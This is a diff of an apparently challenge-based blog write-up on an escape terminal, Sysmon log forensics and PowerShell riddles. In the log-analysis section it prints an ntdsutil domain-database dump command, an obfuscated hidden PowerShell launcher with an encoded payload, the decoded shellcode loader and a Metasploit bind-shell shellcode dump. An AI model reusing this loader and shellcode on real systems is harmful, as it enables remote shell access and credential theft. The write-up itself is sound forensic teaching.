@@ -98,10 +98,12 @@ He will ask for help with his terminal challenge, where he needs to break out of
 
 The banner text for the terminal is:
 
-<pre class="wp-block-preformatted">Oh, many UNIX tools grow old, but this one's showing gray. That Pepper LOLs and rolls her eyes, sends mocking looks my way. I need to exit, run - get out! - and celebrate the yule. Your challenge is to help this elf escape this blasted tool. 
+{% highlight plain_text %}
+Oh, many UNIX tools grow old, but this one's showing gray. That Pepper LOLs and rolls her eyes, sends mocking looks my way. I need to exit, run - get out! - and celebrate the yule. Your challenge is to help this elf escape this blasted tool. 
 -Bushy Evergreen 
 Exit ed. 
-1100 </pre>
+1100 
+{% endhighlight %}
 
 To solve it, just type &#8220;q&#8221; for quit.
 
@@ -189,13 +191,17 @@ The words above in bold are subtle hints to solving this challenge. The problem 
 
 To show WHICH &#8220;ls&#8221; you are currently running:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">~$ which ls
-/usr/local/bin/ls</pre>
+```
+~$ which ls
+/usr/local/bin/ls
+```
 
 To discover all the &#8220;ls&#8221; files on the current PATH, use &#8220;whereis&#8221;:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">~$ whereis ls
-ls: /bin/ls /usr/local/bin/ls /usr/share/man/man1/ls.1.gz</pre>
+```
+~$ whereis ls
+ls: /bin/ls /usr/local/bin/ls /usr/share/man/man1/ls.1.gz
+```
 
 WHEREIS wasn&#8217;t one of the hints given in the banner text, but it&#8217;s the best suited for this problem.
 
@@ -218,11 +224,14 @@ In the blog post there is a line _&#8220;An attacker with privileged access to a
 
 Or you can follow the execution through the log. Start with: 
 
-<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">eql query -f sysmon-data.json 'process where parent_process_name == "lsass.exe"' | jq</pre>
+```
+eql query -f sysmon-data.json 'process where parent_process_name == "lsass.exe"' | jq
+```
 
 Those results will show a &#8220;cmd.exe&#8221; process created. Find what commands were entered by using the process id (PID) for &#8220;cmd.exe&#8221; and searching against the parent process id (PPID).
 
-<pre class="EnlighterJSRAW" data-enlighter-language="json" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ᐅ eql query -f sysmon-data.json 'process where ppid == 3440' | jq
+```
+ᐅ eql query -f sysmon-data.json 'process where ppid == 3440' | jq
 {
   "command_line": "ntdsutil.exe  \"ac i ntds\" ifm \"create full c:\\hive\" q q",
   "event_type": "process",
@@ -240,7 +249,8 @@ Those results will show a &#8220;cmd.exe&#8221; process created. Find what comma
   "user": "NT AUTHORITY\\SYSTEM",
   "user_domain": "NT AUTHORITY",
   "user_name": "SYSTEM"
-}</pre>
+}
+```
 
 You&#8217;ll see the same output that&#8217;s in the blog post, &#8220;**ntdsutil.exe**&#8220;. And that is the answer to the Objective.
 
@@ -248,13 +258,14 @@ You&#8217;ll see the same output that&#8217;s in the blog post, &#8220;**ntdsuti
 
 Instead of searching by Parent Process ID, I first searched for &#8220;cmd.exe&#8221; against the &#8220;parent\_process\_name&#8221; field. Which gave a lot of results, including some powershell exploits. 
 
-<pre class="EnlighterJSRAW" data-enlighter-language="json" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">{
-"command_line": "powershell.exe  -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$en&lt;br>v:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.&lt;br>FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKne&lt;br>010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEn&lt;br>iDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2et&lt;br>YJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mId&lt;br>lNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4V&lt;br>qB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6&lt;br>Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ&lt;br>5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcw&lt;br>YlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KY&lt;br>qglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiY&lt;br>SDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSq&lt;br>DvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo992&lt;br>5cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLa&lt;br>fNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2&lt;br>w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKS&lt;br>hHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvx&lt;br>JCgAA''))),System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.Redirec&lt;br>tStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=System.Diagnostics.Process]::Start($s);\"",
+```
+{
+"command_line": "powershell.exe  -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$en<br>v:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.<br>FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAKne<br>010CA7VWbW/aSBD+nEj5D1aFhK0QjANtmkiVbs2bITiBGMxb0Wljr83C2gZ7DZhe//uNAaepmt61J52Vl/XuzOzMM8/M2Il9i9PAF2JdaQhfLs7PujjEn<br>iDmaOVDQcjtzYRz6ewMDnKb7W74KHwSxClarWqBh6k/u7urxmFIfH58LzYJR1FEvGdGSSRKwl/CcE5CcvX4vCAWF74IuT+LTRY8Y3YSS6rYmhPhCvl2et<br>YJLJz6UzRWjHIx//lzXppeKbNifR1jFol5I4k48Yo2Y3lJ+CqlF/aTFRHzOrXCIAocXhxSv3xdHPgRdsgDWNsQnfB5YEd5CcKAn5DwOPSFY0CpheO5mId<br>lNwwsZNshiaJ8QZimtqez2R/i9HTxU+xz6pFiy+ckDFYGCTfUIlFRw77NyBNxZqBl8JD67kySQGwTLImY82PGCsLvmBEfyDaD7VeVxNdKINXloVSAXL4V<br>qB7YMSNH1fwbnqYEkOB5IQGA9/Xi/OLcySjjd25fMwZWZ9PDmoB7YjeI6EHsk1AqCDrcg3kQJvCa64cxkWYv4Aq5Zd2ghZ/rK5kwiHqm/ecA9qZmQO0Z6<br>Jxymks26e7PmVkjDvVJLfGxR62MfOJbKBOHkUOExUzsAXwS86cDYtcIIy7mKWxpsn9Qq3uUv+iqMWU2CZEFmYrAK0ii9L0zx0yI+ZavEw8gOr4D+3IOUJ<br>5k0ieaJ9nt6TsI5asMR1FB6MZQc1ZBMAhmxC4IyI/o6QjFPDgs89/c1WPGqYUjnpmbSUcUT7dVAz/iYWxBziDyvrEiFsUsBaIgaNQmamJQN7s1/yYMVcw<br>YlAFY2kAaYCcN3+ApE0Jw8JB1qWgQ3vJWjHggcyj9BsMuFPqJ7AfqYJfY+e/9y5h8pG2KQwbAK+8guQYLeEEwacihf6SYHgj0325/1TrAj2pITlkQs9KY<br>qglPGZ2zrZSMJ0gOAIQcgm+EgafiiHyoHDuE+E5+pFUEz7jlM91Sl1RBW6q0dPgd0HIrqN3Y9+2FJoe13dxBraila91aT9Mqm7ZhVrhRb/H7bovr9dFiY<br>SDtaTDmkxbS+rS0HFf2qzbdGx1kj3fyh72635bU3X7h2s645jjujWM8Ke8btDOs9tTSNe7U6nFnqG7VUiWq063Wo4Pest3gz2OT4YEjuyPlFtNdJ1yYSq<br>DvWwg152Vr33bM5ly3k7FGyUIudWgP9RC6t54Gg6a7cpsRkm/NddVboHUDI4xaqG4m7fdM7Q0aKhrU1R5+DLrly5qsTOx1vTEZ4bbH7KYmK+MRslEo992<br>5cvM491OcsKuu1VQGdSZJQwaZbgVplWu6n6x7TRfVQcb0AoQbdDm4HIHNhz7oDAeKHSDut0aybLqyixxjPsZIBWl1jRpqUE0+dvWubJrXc+V5qczBZzLa<br>fNTb6LJhdWVZvvSe4a+MLH2180fq9mbjakZwj++xuZmUZaW/bTpojS4vVUV95lq93N7AvX35dvDpXcodIE8uqHmvaPGzbq7jMJpjBnSBLp1VZyMIG6e+2<br>w1oqiGKh5G9JKFPGMw7mIgZzRFjgZU2/rRDw8w5ToJ0MA1gWb5+cyUJL4LSt3GQbd3dTcBJKBvbKnaI7/J5obQrl0rQ2ku7Sgki/PWwqsEqEcFQIR0MKS<br>hHs+xgVkrrKMe0yej/hepUvXP4Z/8LVN/2/uH0l+ArFQ7h/rD7/cZvgfnbgQ8x5SBpQPth5Dj53oz/xIpXXwZpUiDrzulJP+4eY371AB8MF+d/A60hbvx<br>JCgAA''))),System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.Redirec<br>tStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=System.Diagnostics.Process]::Start($s);\"",
 "event_type": "process",
 "logon_id": 999,
 "parent_process_name": "cmd.exe",
 "parent_process_path": "C:\\Windows\\System32\\cmd.exe",
-"pid": 3824,&lt;br>  "ppid": 3768,
+"pid": 3824,<br>  "ppid": 3768,
 "process_name": "powershell.exe",
 "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
 "subtype": "create",
@@ -264,11 +275,13 @@ Instead of searching by Parent Process ID, I first searched for &#8220;cmd.exe&#
 "user": "NT AUTHORITY\\SYSTEM",
 "user_domain": "NT AUTHORITY",
 "user_name": "SYSTEM"
-}</pre>
+}
+```
 
 Taking the powershell code and formatting it nicely gives:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">if ([IntPtr]::Size - eq 4) {
+```
+if ([IntPtr]::Size - eq 4) {
     $b = 'powershell.exe'
 } else {
     $b = $env: windir + '\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'
@@ -280,25 +293,31 @@ $s.UseShellExecute = $false;
 $s.RedirectStandardOutput = $true;
 $s.WindowStyle = 'Hidden';
 $s.CreateNoWindow = $true;
-$p = [System.Diagnostics.Process]::Start($s);</pre>
+$p = [System.Diagnostics.Process]::Start($s);
+```
 
 Extract the FromBase64String, and run it through a base64 decode with:
 
-<pre class="wp-block-preformatted">echo -n 'H4sIAKne010...' | base64 -d | xxd
+```
+echo -n 'H4sIAKne010...' | base64 -d | xxd
 00000000: 1f8b 0800 a9de d35d 0203 b556 6d6f da48  .......]...Vmo.H
 00000010: 10fe 9c48 f90f 5685 84ad 108c 036d 9a48  ...H..V......m.H
 00000020: 956e cd9b 2138 8118 cc5b d169 63af cdc2  .n..!8...[.ic...
 00000030: da06 7b0d 985e fffb 8d01 a7a9 9ade b527  ..{..^.........'
 00000040: 9d95 97f5 eecc eccc 33cf ccd8 897d 8bd3  ........3....}..
-...</pre>
+...
+```
 
 That is binary data and if you look up the first few bytes, you&#8217;ll find out that it is a [GZIP file](https://www.filesignatures.net/index.php?page=search&search=1F8B08&mode=SIG). You can save it into a file like so:
 
-<pre class="wp-block-preformatted">echo -n 'H4sIAKne010...' | base64 -d &gt; outfile.gz</pre>
+```
+echo -n 'H4sIAKne010...' | base64 -d > outfile.gz
+```
 
 Then unzip the file and look at it&#8217;s contents:
 
-<pre class="wp-block-preformatted">ᐅ gzip -d outfile.gz
+```
+ᐅ gzip -d outfile.gz
 ᐅ cat outfile
 function uM1F {
          Param ($i46, $zVytt)
@@ -319,15 +338,17 @@ AAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYa
 +FcP///+mb////AcMpxnXBw7vgHSoKaKaVvZ3/1TwGfAqA++B1BbtHE3JvagBT/9U=")
  $oDm = <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll VirtualAlloc), (nL9 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $dc.Length,0x3000, 0x40)
  $lHZX = <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll CreateThread), (nL9 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$oDm,[IntPtr]::Zero,0,[IntPtr]::Zero)
- <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null</pre>
+ <a href=":Copy">System.Runtime.InteropServices.Marshal</a>::GetDelegateForFunctionPointer((uM1F kernel32.dll WaitForSingleObject), (nL9 @([IntPtr], [Int32]))).Invoke($lHZX,0xffffffff) | Out-Null
+ ```
 
 This is more powershell exploit script, and there&#8217;s another base64 encoded payload. Decode it the same way as before to get another binary string.
 
-<pre class="wp-block-preformatted">ᐅ echo -n '/OiCAAAAYInlMc...' | base64 -d | xxd
+```
+ᐅ echo -n '/OiCAAAAYInlMc...' | base64 -d | xxd
 00000000: fce8 8200 0000 6089 e531 c064 8b50 308b  ......`..1.d.P0.
-00000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c  R..R..r(..J&1..&lt;
+00000010: 520c 8b52 148b 7228 0fb7 4a26 31ff ac3c  R..R..r(..J&1..<
 00000020: 617c 022c 20c1 cf0d 01c7 e2f2 5257 8b52  a|., .......RW.R
-00000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920  ..J&lt;.L.x.H..Q.Y
+00000030: 108b 4a3c 8b4c 1178 e348 01d1 518b 5920  ..J<.L.x.H..Q.Y
 00000040: 01d3 8b49 18e3 3a49 8b34 8b01 d631 ffac  ...I..:I.4...1..
 00000050: c1cf 0d01 c738 e075 f603 7df8 3b7d 2475  .....8.u..}.;}$u
 00000060: e458 8b58 2401 d366 8b0c 4b8b 581c 01d3  .X.X$..f..K.X...
@@ -345,10 +366,11 @@ This is more powershell exploit script, and there&#8217;s another base64 encoded
 00000120: 0000 6a00 5068 0b2f 0f30 ffd5 5768 756e  ..j.Ph./.0..Whun
 00000130: 4d61 ffd5 5e5e ff0c 240f 8570 ffff ffe9  Ma..^^..$..p....
 00000140: 9bff ffff 01c3 29c6 75c1 c3bb e01d 2a0a  ......).u.....*.
-00000150: 68a6 95bd 9dff d53c 067c 0a80 fbe0 7505  h......&lt;.|....u.
-00000160: bb47 1372 6f6a 0053 ffd5</pre>
+00000150: 68a6 95bd 9dff d53c 067c 0a80 fbe0 7505  h......<.|....u.
+00000160: bb47 1372 6f6a 0053 ffd5
+```
 
-Looking this code up online [shows](https://samsclass.info/127/proj/p8bim.htm) that it is a shellcode created from metasploit with &#8220;msfvenom -p windows/shell\_bind\_tcp -f c&#8221;
+Looking this code up online [shows](https://samsclass.info/127/proj/p8bim.htm) that it is a shellcode created from metasploit with `msfvenom -p windows/shell\_bind\_tcp -f c`
 
 However, it is supremely unhelpful in solving the Objective. What a waste of time.
 
@@ -379,16 +401,17 @@ This is another defense related objective where you have to dig through logs and
 This terminal challenge is about figuring out how to make PowerShell do what you want in order to solve riddles (a LOT of them). You&#8217;re given a PowerShell prompt that can only process PowerShell commands.
 
 <pre class="wp-block-preformatted">Elf University Student Research Terminal - Christmas Cheer Laser Project
- The research department at Elf University is currently working on a top-secret
- Laser which shoots laser beams of Christmas cheer at a range of hundreds of   
- miles. The student research team was successfully able to tweak the laser to  
- JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.  
- Unfortunately, someone broke into the research terminal, changed the laser    
- settings through the Web API and left a note behind at /home/callingcard.txt. 
- Read the calling card and follow the clues to find the correct laser Settings.
- Apply these correct settings to the laser using it's Web API to achieve laser 
- output of 5 Mega-Jollies per liter.                                           
- Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. </pre>
+The research department at Elf University is currently working on a top-secret
+Laser which shoots laser beams of Christmas cheer at a range of hundreds of   
+miles. The student research team was successfully able to tweak the laser to  
+JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.  
+Unfortunately, someone broke into the research terminal, changed the laser    
+settings through the Web API and left a note behind at /home/callingcard.txt. 
+Read the calling card and follow the clues to find the correct laser Settings.
+Apply these correct settings to the laser using it's Web API to achieve laser 
+output of 5 Mega-Jollies per liter.                                           
+
+Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info. </pre>
 
 The goal of this challenge is to find the correct settings to calibrate the laser with and apply them. To accomplish that, you have to answer a string of riddles that lead one to another and along the way you will see the calibration settings scattered here and there.
 
@@ -398,38 +421,43 @@ I&#8217;ll step through the riddles and their solutions and highlight the calibr
 
 A clue to this riddle was given in the banner text, &#8220;/home/callingcard.txt&#8221; and this is how to read it:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> Get-Content /home/callingcard.txt
- What's become of your dear laser?
- Fa la la la la, la la la la
- Seems you can't now seem to raise her!
- Fa la la la la, la la la la
- Could commands hold riddles in hist'ry?
- Fa la la la la, la la la la
- Nay! You'll ever suffer myst'ry!
- Fa la la la la, la la la la</pre>
+```
+PS /home/elf> Get-Content /home/callingcard.txt
+What's become of your dear laser?
+Fa la la la la, la la la la
+Seems you can't now seem to raise her!
+Fa la la la la, la la la la
+Could commands hold riddles in hist'ry?
+Fa la la la la, la la la la
+Nay! You'll ever suffer myst'ry!
+Fa la la la la, la la la la
+```
 
 Since the riddle mentions history, use &#8220;Get-History&#8221; command to retrieve the command line history.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> Get-History
+```
+PS /home/elf> Get-History
 
-  Id CommandLine
-  -- -----------
-   1 Get-Help -Name Get-Process 
-   2 Get-Help -Name Get-* 
-   3 Set-ExecutionPolicy Unrestricted 
-   4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm 
-   5 Get-Service | Export-CSV c:\service.csv 
-   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
-   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
-   8 Get-EventLog -Log "Application" 
-   9 I have many name=value variables that I share to applications system wide. At a command I w…
-  10 Get-Content /home/callingcard.txt</pre>
+ Id CommandLine
+ -- -----------
+  1 Get-Help -Name Get-Process 
+  2 Get-Help -Name Get-* 
+  3 Set-ExecutionPolicy Unrestricted 
+  4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm 
+  5 Get-Service | Export-CSV c:\service.csv 
+  6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
+  7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
+  8 Get-EventLog -Log "Application" 
+  9 I have many name=value variables that I share to applications system wide. At a command I w…
+ 10 Get-Content /home/callingcard.txt
+ ```
 
 There&#8217;s a calibration settings in the history, along with the next riddle, at position number 9. To inspect it further, use &#8220;Get-History -ID&#8221; and &#8220;Format-List -Property&#8221; to show everything about that entry.
 
 #### Riddle 2 &#8211; Environment
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> Get-History -ID 9 | Format-List -Property *
+```
+PS /home/elf> Get-History -ID 9 | Format-List -Property *
 
 Id                 : 9
 CommandLine        : I have many name=value variables that I share to applications system wide. 
@@ -437,11 +465,13 @@ CommandLine        : I have many name=value variables that I share to applicatio
 ExecutionStatus    : Completed
 StartExecutionTime : 11/29/19 4:57:16 PM
 EndExecutionTime   : 11/29/19 4:57:16 PM
-Duration           : 00:00:00.6090308</pre>
+Duration           : 00:00:00.6090308
+```
 
-The riddle mentions name=value variables, and that is referring to environment variables. To see them, use the command &#8220;Get-ChildItems env:&#8221; and it requires the colon at the end.
+The riddle mentions name=value variables, and that is referring to environment variables. To see them, use the command `Get-ChildItems env:` and it requires the colon at the end.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> Get-ChildItem env:
+```
+PS /home/elf> Get-ChildItem env:
 
 Name                           Value
 ----                           -----
@@ -466,20 +496,24 @@ USER                           elf
 USERDOMAIN                     laserterminal
 userdomain                     laserterminal
 username                       elf
-USERNAME                       elf</pre>
+USERNAME                       elf
+```
 
-The next riddle is the &#8220;riddle&#8221; variable. Use the command &#8220;Get-Content env:riddle&#8221; to see the whole thing.
+The next riddle is the &#8220;riddle&#8221; variable. Use the command `Get-Content env:riddle` to see the whole thing.
 
 #### Riddle 3 &#8211; Recurse /etc/
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> Get-Content env:riddle
-Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.</pre>
+```
+PS /home/elf> Get-Content env:riddle
+Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.
+```
 
-The riddle tells us to go through all the files and folders of /etc and find the newest file. Use the command &#8220;cd /etc; Get-ChildItem -Recurse | Sort-Object -Property LastWriteTime&#8221;. That will change to the /etc directory, then get all the files and folders with &#8220;Get-ChildItem&#8221;, then it sorts them based on the property &#8220;LastWriteTime&#8221;.
+The riddle tells us to go through all the files and folders of /etc and find the newest file. Use the command `cd /etc; Get-ChildItem -Recurse | Sort-Object -Property LastWriteTime`. That will change to the /etc directory, then get all the files and folders with `Get-ChildItem`, then it sorts them based on the property `LastWriteTime`.
 
 It will show five files that have a newer date than the rest.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Directory: /etc
+```
+Directory: /etc
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -496,22 +530,26 @@ Mode                LastWriteTime         Length Name
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
---r---           1/10/20  9:47 PM        5662902 archive</pre>
+--r---           1/10/20  9:47 PM        5662902 archive
+```
 
-The most interesting one is &#8220;archive&#8221;. To see what&#8217;s inside, use the command &#8220;Expand-Archive -Path apt/archive -DestinationPath &#8216;/home/elf/archive/'&#8221;. Then go back to the home directory and look at the archive folder.
+The most interesting one is &#8220;archive&#8221;. To see what&#8217;s inside, use the command `Expand-Archive -Path apt/archive -DestinationPath '/home/elf/archive/'`. Then go back to the home directory and look at the archive folder.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /etc> cd /home/elf; Get-ChildItem archive
+```
+PS /etc> cd /home/elf; Get-ChildItem archive
 
 
     Directory: /home/elf/archive
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
-d-----           1/10/20  9:53 PM                refraction</pre>
+d-----           1/10/20  9:53 PM                refraction
+```
 
 There&#8217;s another folder called &#8216;refraction&#8217;. Go to that directory and use Get-ChildItem to list its contents.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf> cd archive/refraction
+```
+PS /home/elf> cd archive/refraction
 PS /home/elf/archive/refraction> Get-ChildItem
 
 
@@ -520,26 +558,32 @@ PS /home/elf/archive/refraction> Get-ChildItem
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 ------           11/7/19 11:57 AM            134 riddle
-------           11/5/19  2:26 PM        5724384 runme.elf</pre>
+------           11/5/19  2:26 PM        5724384 runme.elf
+```
 
 The &#8220;runme.elf&#8221; file is clearly a binary file if you try to get it&#8217;s contents, so to run it you have to change it&#8217;s mode properties. You can actually use a few standard bash shell commands here, and &#8220;chmod&#8221; is one of them.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf/archive/refraction> chmod +x runme.elf
+```
+PS /home/elf/archive/refraction> chmod +x runme.elf
 PS /home/elf/archive/refraction> ./runme.elf       
-refraction?val=1.867</pre>
+refraction?val=1.867
+```
 
 That program prints out another one of the laser values. The other file in that directory is the next riddle.
 
 #### Riddle 4 &#8211; md5 Hash Search
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf/archive/refraction> Get-Content riddle
+```
+PS /home/elf/archive/refraction> Get-Content riddle
 Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:
 
-25520151A320B5B0D21561F92C8F6224</pre>
+25520151A320B5B0D21561F92C8F6224
+```
 
 Following clues in this riddle, look at all the files and directories within /home/elf.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS /home/elf/archive/refraction> cd 
+```
+PS /home/elf/archive/refraction> cd 
 PS /home/elf> Get-ChildItem
 
 
@@ -549,45 +593,53 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----           1/11/20  3:28 AM                archive
 d-r---          12/13/19  5:15 PM                depths
---r---          12/13/19  4:29 PM           2029 motd</pre>
+--r---          12/13/19  4:29 PM           2029 motd
+```
 
